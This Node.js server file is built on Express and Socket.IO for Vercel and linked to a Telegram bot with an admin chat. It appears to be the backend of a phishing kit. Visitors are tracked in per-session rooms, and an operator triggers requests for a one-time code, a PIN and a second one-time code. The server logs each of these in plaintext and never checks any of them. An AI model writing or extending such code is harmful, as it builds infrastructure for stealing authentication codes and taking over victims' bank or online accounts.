const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);

// Initialize Socket.IO with polling fallback (WebSockets are not supported natively on Vercel Serverless)
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    transports: ['polling']
});

// Parse standard payloads
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// NOTE: Vercel's CDN serves everything inside /public automatically.
// We keep this as a local fallback when testing your project locally.
app.use(express.static(path.join(__dirname, 'public')));

// Root route: Serve index.html statically 
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Setup the active rooms tracker (Volatile in-memory - resets as containers cycle)
global.activeRooms = global.activeRooms || {};

const botToken = process.env.TELEGRAM_BOT_TOKEN;
const adminChatId = process.env.TELEGRAM_ADMIN_CHAT_ID;

// Use VERCEL_URL to construct the webhook URL for the bot
const vercelUrl = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : '';

// Import and bind the Telegram Bot Manager (passing the Vercel URL config)
const initializeBot = require('./bot_manager');
const bot = initializeBot(botToken, io, vercelUrl);

// Explicit webhook hook route used by Telegram to POST incoming bot updates
app.post('/api/bot-webhook', (req, res) => {
    if (bot) {
        bot.processUpdate(req.body);
    }
    res.sendStatus(200);
});

// Socket.IO Communication Pipeline
io.on('connection', (socket) => {
    socket.on('join-room', (appId) => {
        if (!appId) return;
        socket.join(appId);
        
        if (!global.activeRooms[appId]) {
            global.activeRooms[appId] = { socketId: socket.id, status: 'pending' };
        } else {
            global.activeRooms[appId].socketId = socket.id;
        }
        socket.emit('room-joined-success', { appId, status: global.activeRooms[appId].status });
    });

    socket.on('request-otp1', (data) => {
        const { appId } = data;
        if (global.activeRooms[appId]) {
            global.activeRooms[appId].status = 'otp1_requested';
        }
        socket.emit('otp1-requested-success');
    });

    socket.on('verify-otp1', (data) => {
        const { appId, code } = data;
        console.log(`[Event] Verify OTP1 for ${appId}: ${code}`);
    });

    socket.on('verify-pin', (data) => {
        const { appId, pin } = data;
        console.log(`[Event] Verify PIN for ${appId}: ${pin}`);
    });

    socket.on('verify-otp2', (data) => {
        const { appId, code } = data;
        console.log(`[Event] Verify OTP2 for ${appId}: ${code}`);
    });
});

// Export the server instance directly so Vercel can resolve it as a serverless function
module.exports = server;
